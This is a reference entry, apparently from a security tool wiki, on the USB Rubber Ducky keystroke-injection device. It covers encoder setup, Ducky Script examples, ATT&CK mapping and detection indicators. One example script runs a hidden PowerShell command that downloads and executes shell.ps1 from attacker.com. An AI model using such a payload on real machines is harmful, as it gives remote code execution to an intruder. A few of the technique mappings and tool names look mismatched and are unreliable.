---
id: 4a951cfd-5825-4bbb-9d7b-39d3242f858a
type: tool
verified: true
created_at: '2020-02-19T23:14:00.953690+00:00'
updated_at: '2023-05-30T19:45:08.980471+00:00'
platforms:
  - Windows
  - Linux
  - macOS
tags:
  - hardware
  - social-engineering
  - physical-access
url: 'https://github.com/hak5darren/USB-Rubber-Ducky'
commands:
  - '[[commands/duckencoder-encode-script-to-inject-bin]]'
validated: true
---

# Rubber-Ducky

**Status**: ✓ Verified

## Overview

The USB Rubber Ducky is a hardware tool that emulates a HID (Human Interface Device) keyboard, allowing it to inject keystrokes at high speed into a target computer upon connection via USB. It is commonly used in penetration testing for rapid payload delivery, such as installing backdoors, exfiltrating data, stealing credentials, or executing other post-exploitation tasks. The device runs scripts written in Ducky Script, which are compiled into binary format and stored on a microSD card.

## Description

The Rubber Ducky disguises itself as a standard USB keyboard to bypass security controls that monitor for unknown devices. Once plugged in, it executes pre-programmed keystrokes to open command prompts, download tools, or perform other automated actions. This makes it ideal for physical access scenarios, social engineering attacks, or supply chain compromises. Payloads can be customized for different operating systems and objectives, but require physical insertion into the target.

## Features

- HID Emulation: Acts as a keyboard to inject commands without software installation on the target.
- MicroSD Storage: Supports payloads up to several MB on a standard microSD card.
- Cross-Platform: Works on Windows, Linux, macOS, and other systems with USB HID support.
- Ducky Script Language: Simple scripting syntax for keystrokes, delays, strings, and control commands.
- Encoding Tool: Uses duckencoder to compile scripts into executable binaries.

## Installation

### Requirements

- USB Rubber Ducky hardware device.
- MicroSD card (up to 256GB supported, formatted FAT32).
- Java Runtime Environment (JRE) for the encoder tool.
- Access to a computer for script development and encoding.

### Install Commands

The Rubber Ducky is a hardware device and does not require traditional installation. However, set up the encoding software as follows:

```bash
# Clone the Duck Encoder repository
sudo apt update && sudo apt install default-jre git -y
git clone https://github.com/hak5darren/USB-Rubber-Ducky.git
cd USB-Rubber-Ducky/encoder
# The duckencoder.jar is now available
```

For firmware updates on the device itself, refer to the official Hak5 documentation (requires Twinkey or similar tools, not covered here).

## Basic Usage

```bash
# View help for duckencoder (used to prepare payloads)
java -jar duckencoder.jar -h
```

### Common Options

| Option | Description |
|--------|-------------|
| -i | Input Ducky Script file |
| -o | Output binary file (e.g., inject.bin) |
| -l | Language layout (e.g., us, uk) |
| -k | Keyboard layout file |

## Examples

### Example 1: Basic Usage

Prepare a simple payload script and encode it:

1. Create a Ducky Script file (e.g., open-notepad.txt):
   ```
   DELAY 1000
   GUI r
   DELAY 200
   STRING notepad
   ENTER
   ```

2. Encode using the command:
   ```bash
   java -jar duckencoder.jar -i open-notepad.txt -o inject.bin
   ```

3. Copy inject.bin to the root of the microSD card, insert into Rubber Ducky, and plug into target.

### Example 2: Advanced Usage

For a payload that downloads and executes a tool:

1. Script example (download-payload.txt):
   ```
   DELAY 1000
   GUI r
   DELAY 500
   STRING powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"
   ENTER
   ```

2. Encode:
   ```bash
   java -jar duckencoder.jar -i download-payload.txt -l us -o inject.bin
   ```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[PowerShell]] PowerShell
- [[Execution through API]] Native API
- [[T1566.001]] Phishing: Spearphishing Attachment (for physical delivery)

### Tactics

- [[Execution]] Execution
- [[Initial Access]] Initial Access

## Detection

Indicators and methods for detecting this tool's usage:

- Unusual USB device connections (HID keyboard with high keystroke rate).
- Monitor for rapid command executions (e.g., via EDR tools like Sysmon for process creation from unexpected sources).
- USB device logs in Windows Event Viewer (Event ID 2003 for HID attachments).
- Behavioral anomalies: Sudden downloads or executions triggered by keyboard input without user interaction.

## Related Procedures

- Procedures using this tool for physical payload delivery (e.g., [[procedures/Deploy-Rubber-Ducky-for-Credential-Harvesting]]).

## Related Tools

- [[tools/Twin-Ducky]] (firmware flasher for Rubber Ducky).
- [[tools/Hak5-Keylogger]] (related hardware for credential capture).

## References

- Official GitHub Repository: https://github.com/hak5darren/USB-Rubber-Ducky
- Ducky Script Documentation: https://docs.hak5.org/hc/en-us/categories/360002273974-DuckyScript-3
- Hak5 Forums for Community Payloads: https://forums.hak5.org
